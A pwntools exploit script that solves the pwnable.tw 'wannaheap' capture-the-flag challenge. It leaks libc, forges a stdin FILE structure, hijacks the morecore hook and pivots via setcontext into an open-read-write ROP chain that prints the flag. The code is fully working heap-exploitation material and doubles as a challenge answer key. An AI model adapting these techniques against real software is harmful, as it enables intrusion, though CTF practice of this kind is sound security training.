#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./wannaheap_patched', checksec=False)
libc = ELF('./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 3
USE_PTY = True
GDB_ATTACH_DELAY = 1

match TERMINAL:
    case 1:
        context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
    case 2:
        context.terminal = ["tmux", "split-window", "-h"]
    case 3:
        context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
                            "-w", "0", "split-pane", "-V", "-s", "0.5",
                            "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
    case _:
        raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *__read_nocancel+5
b *0x155554e87550
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def conn():
    if args.LOCAL:
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
        else:
            p = process([e.path])
        sleep(0.25)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10305
        return remote(host, port)


def Allocate(key, data):
    sa(p, b'>', b'A')
    sleep(0.1)
    sa(p, b'key', key)
    sleep(0.1)
    sa(p, b'data', data)

attempt = 0

while True:
    sleep(0.5)
    p = conn()

    slan(p, b'Size', 0x314000 + libc.symbols['_IO_2_1_stdin_'] + 40)
    slan(p, b'Size', 0x313370)
    sla(p, b'Content', b'A')

    Allocate(b'\x01', b'A')
    Allocate(b'\x02', A(9)) # Stack contains libc address on the second allocate
    Allocate(b'\x03', b'A')

    sa(p, b'>', b'R')
    sleep(0.1)
    sa(p, b'key', b'\x02')

    r = p.recvuntil(A(8), timeout=0.5)
    if len(r) < 8:
        p.close()
        continue
    libc.address = leak_bytes(rn(p, 6), 0x3c2641)
    lg("libc base", libc.address)

    sleep(0.25)

    s(p, b'\xff')

    sleep(0.25)

    s(p, p64(libc.symbols['_IO_2_1_stdin_'] + 0x1337))

    attach(p)

    stdin = flat(
        libc.symbols['_IO_2_1_stdin_'] + 0x100,
        0,
        0,
        0,
        0,
        0,
        0,
        0xffffffffffffffff,
        0,
        libc.bss(),
        0xffffffffffffffff,
        0,
        libc.symbols['_IO_wide_data_0'],
        0,
        0,
        0,
        0xffffffff,
        0,
        0,
        libc.symbols['__GI__IO_file_jumps'],
    )

    morecore = flat(
        libc.address + 0x000000000006ebbb,
        libc.symbols['print_and_abort'],
        libc.address + 0x18c04e,
        libc.address + 0x18c04e,
    )

    new_rsp = libc.symbols['_IO_wide_data_0'] + 8
    setcontext = flat(
        libc.symbols['setcontext'] + 46,
        0,
        0,
        1,
        2,
        0,
        0,
        0xffffffffffffffff,
        libc.symbols['__libc_utmp_unknown_functions'],
        libc.symbols['default_file_name'],
        p64(libc.symbols['_nl_C_LC_CTYPE']) * 6,
        new_rsp, # rsp
        libc.address + 0x000000000017258f, # rcx
    )

    pop_rax_ret = libc.address + 0x000000000003a998
    pop_rdi_ret = libc.address + 0x000000000001fd7a
    pop_rsi_ret = libc.address + 0x000000000001fcbd
    pop_rdx_ret = libc.address + 0x0000000000001b92
    syscall = libc.address + 0x00000000000bc765
    flag_path = new_rsp + 0x100
    flag_addr = flag_path + 0x20

    orw_rop = flat(
        0,
        pop_rax_ret, 2,
        pop_rdi_ret, flag_path,
        pop_rsi_ret, 0,
        pop_rdx_ret, 0,
        syscall,

        pop_rax_ret, 0,
        pop_rdi_ret, 1,
        pop_rsi_ret, flag_addr,
        pop_rdx_ret, 0x100,
        syscall,

        pop_rax_ret, 1,
        pop_rdi_ret, 0,
        pop_rsi_ret, flag_addr,
        pop_rdx_ret, 0x100,
        syscall,

        pop_rax_ret, 0x3c,
        pop_rdi_ret, 0,
        syscall,

        b'/home/wannaheap/flag\0'
    ).ljust(0x130, b'\0')

    pl = flat(
        stdin,
        orw_rop,
        libc.symbols['__GI__IO_wfile_jumps'],
        0,
        libc.symbols['memalign_hook_ini'],
        libc.symbols['realloc_hook_ini'],
        libc.symbols['sysmalloc'] + 1521,
        z(0x898),
        morecore,
        setcontext
    )

    try:
        sleep(0.25)
        
        s(p, pl)

        sleep(0.25)

        s(p, b'A')

        sleep(0.25)

        s(p, b'\x07')

        print(ru(p, b'}').strip().decode())
        p.close()
        break
    except:
        p.close()
        continue